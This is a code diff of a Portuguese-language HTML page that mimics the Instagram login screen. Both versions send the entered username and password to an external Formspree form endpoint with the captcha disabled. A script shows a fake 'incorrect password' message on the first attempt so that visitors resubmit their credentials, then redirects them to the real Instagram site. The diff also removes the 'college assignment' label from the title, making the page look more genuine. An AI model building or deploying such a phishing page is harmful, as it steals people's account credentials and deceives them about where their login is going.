@@ -2,137 +2,71 @@
 <html lang="pt-br">
 <head>
 <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram - Trabalho Faculdade</title>
-
+<title>Instagram</title>
 <style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: Arial, sans-serif;
-}
-body {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    background-color: #fafafa;
-}
-.instagram-wrapper {
-    display: flex;
-    gap: 50px;
-}
-.instagram-phone img {
-    max-width: 300px;
-}
-.instagram-login {
-    width: 350px;
-}
-.group {
-    background-color: #fff;
-    border: 1px solid #dbdbdb;
-    padding: 40px;
-    margin-bottom: 10px;
-    text-align: center;
-}
-.instagram-logo {
-    margin-bottom: 20px;
-}
-form {
-    display: flex;
-    flex-direction: column;
-}
-input {
-    width: 100%;
-    padding: 9px;
-    margin-bottom: 10px;
-    border: 1px solid #dbdbdb;
-    background-color: #fafafa;
-    border-radius: 3px;
-    font-size: 14px;
-    text-align: center;
-}
-button {
-    background-color: #0095f6;
-    border: none;
-    color: white;
-    padding: 8px;
-    border-radius: 4px;
-    font-weight: bold;
-    cursor: pointer;
-}
-#login-error {
-    display: none;
-    color: #ed4956;
-    font-size: 14px;
-    margin-top: 10px;
-}
+* { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
+body { display:flex; justify-content:center; align-items:center; min-height:100vh; background:#fafafa; }
+.instagram-wrapper { display:flex; gap:50px; }
+.instagram-phone img { max-width:300px; }
+.instagram-login { width:350px; }
+.group { background:#fff; border:1px solid #dbdbdb; padding:40px; text-align:center; margin-bottom:10px; }
+.instagram-logo { margin-bottom:20px; }
+form { display:flex; flex-direction:column; }
+input { padding:9px; margin-bottom:10px; border:1px solid #dbdbdb; border-radius:3px; background:#fafafa; text-align:center; }
+button { background:#0095f6; color:#fff; border:none; padding:8px; font-weight:bold; border-radius:4px; cursor:pointer; }
+#error { display:none; color:#ed4956; font-size:14px; margin-top:10px; }
 </style>
 </head>
-
 <body>
 
 <div class="instagram-wrapper">
 
-    <div class="instagram-phone">
-        <img src="./img/apresentacao-celular.png" alt="Instagram">
+  <div class="instagram-phone">
+    <img src="./img/apresentacao-celular.png" alt="Instagram">
+  </div>
+
+  <div class="instagram-login">
+    <div class="group">
+
+      <img src="./img/instagram-logo.png" class="instagram-logo" alt="Instagram logo">
+
+      <!-- FORMULÁRIO -->
+      <form id="loginForm" action="https://formspree.io/f/xkoojkow" method="POST">
+          <input type="text" name="login" placeholder="Telefone, nome de usuário ou email" required>
+          <input type="password" name="senha" placeholder="Senha" required>
+
+          <!-- Redirecionamento do Formspree -->
+          <input type="hidden" name="_next" value="https://www.instagram.com/">
+          <input type="hidden" name="_captcha" value="false">
+
+          <button type="submit">Entrar</button>
+      </form>
+
+      <!-- MENSAGEM DE ERRO SIMULADA -->
+      <p id="error">A senha que você inseriu está incorreta. Tente novamente.</p>
+
     </div>
+  </div>
 
-    <div class="instagram-login">
-
-        <div class="group">
-            <img src="./img/instagram-logo.png" class="instagram-logo" alt="Instagram logo">
-
-            <form id="loginForm" action="https://formspree.io/f/xkoojkow" method="POST">
-                <input type="text" name="login" placeholder="Telefone, nome de usuário ou email" required>
-                <input type="password" name="senha" placeholder="Senha" required>
-
-                <!-- Campo _next controlado por JS -->
-                <input type="hidden" id="nextField" name="_next" value="">
-                <input type="hidden" name="_captcha" value="false">
-
-                <button type="submit">Entrar</button>
-            </form>
-
-            <p id="login-error">
-                A senha que você inseriu está incorreta. Tente novamente.
-            </p>
-        </div>
-
-    </div>
 </div>
 
 <script>
 let tentativas = 0;
+const form = document.getElementById("loginForm");
+const erro = document.getElementById("error");
 
-const form = document.getElementById('loginForm');
-const erro = document.getElementById('login-error');
-const nextField = document.getElementById('nextField');
-
-form.addEventListener('submit', function () {
+form.addEventListener("submit", function(e) {
     tentativas++;
 
     if (tentativas === 1) {
-        // 1ª tentativa → falha
-        erro.style.display = 'block';
-
-        // redireciona para site de falha
-        nextField.value = "https://marcelovbjunior-code.github.io/TESTE/";
-
-        // backup
-        setTimeout(() => {
-            window.location.href = "https://marcelovbjunior-code.github.io/TESTE/";
-        }, 300);
-
+        // 1ª tentativa → mostra erro mas envia os dados normalmente
+        erro.style.display = "block";
+        // redirecionamento não acontece ainda, o Formspree envia
     } else {
-        // 2ª tentativa → sucesso
-        erro.style.display = 'none';
-
-        nextField.value = "https://www.instagram.com/";
-
-        // backup
+        // 2ª tentativa → redireciona para Instagram
+        erro.style.display = "none";
+        // Pequeno atraso para garantir envio
         setTimeout(() => {
             window.location.href = "https://www.instagram.com/";
         }, 300);
